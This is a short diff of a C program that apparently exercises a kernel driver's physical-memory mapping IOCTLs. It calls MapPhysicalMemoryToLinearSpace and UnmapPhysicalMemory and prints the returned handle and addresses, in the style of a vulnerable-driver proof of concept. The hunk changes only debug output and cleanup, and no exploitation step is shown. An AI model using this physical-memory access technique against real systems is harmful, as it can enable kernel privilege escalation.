@@ -48,21 +48,22 @@ int main(char argc, char** argv)
     }
     printf("[*] MapPhysicalMemoryToLinearSpace 0x%X called successfully\n", MapPhysicalMemoryToLinearSpace);
     printf("[*] Buffer from the kernel land: %02X. Received buffer size: %d\n", phys32Struct, bytesReturned);
-    /*
-    printf("[*] inBuffer PhysicalBaseAddress: %p\n", inBuffer.PhysicalBaseAddress);
-    printf("[*] inBuffer SectionHandle: %p\n", inBuffer.SectionHandle);
-    */
+    printf("phys32Struct.dwPhysMemSizeInBytes: %X\n", phys32Struct.dwPhysMemSizeInBytes);
+    printf("phys32Struct.PhysicalMemoryHandle: %X\n", phys32Struct.PhysicalMemoryHandle);
+    printf("phys32Struct.pvPhysAddress: %X\n", phys32Struct.pvPhysAddress);
+    printf("phys32Struct.pvPhysMemLin: %X\n", phys32Struct.pvPhysMemLin);
 
 
+    system("pause");
+
+    CloseHandle(phys32Struct.PhysicalMemoryHandle);
+    
     system("pause");
 
     HANDLE device2 = INVALID_HANDLE_VALUE;
     NTSTATUS status2 = FALSE;
     DWORD bytesReturned2 = 0;
-    printf("phys32Struct.PhysicalBaseAddress: %X\n", phys32Struct.dwPhysMemSizeInBytes);
-    printf("phys32Struct.BusAddress: %X\n", phys32Struct.PhysicalMemoryHandle);
-    printf("phys32Struct.SectionHandle: %X\n", phys32Struct.pvPhysAddress);
-    printf("phys32Struct.SectionHandle: %X\n", phys32Struct.pvPhysMemLin);
+
 
     printf("[ ] Calling UnmapPhysicalMemory 0x%X\n", UnmapPhysicalMemory);
     status = DeviceIoControl(device2, UnmapPhysicalMemory, &phys32Struct,
